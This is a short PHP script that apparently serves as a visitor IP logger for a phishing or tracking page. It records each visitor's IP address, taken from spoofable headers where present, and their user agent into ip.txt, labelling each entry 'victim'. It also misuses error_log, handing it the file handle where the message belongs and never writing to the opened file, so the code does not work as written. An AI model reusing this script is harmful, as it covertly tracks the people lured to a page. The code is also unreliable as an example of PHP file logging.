<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

error_log($fp, $victim);
error_log($fp, $ipaddress);
error_log($fp, $useragent);
error_log($fp, $browser);


fclose($fp);
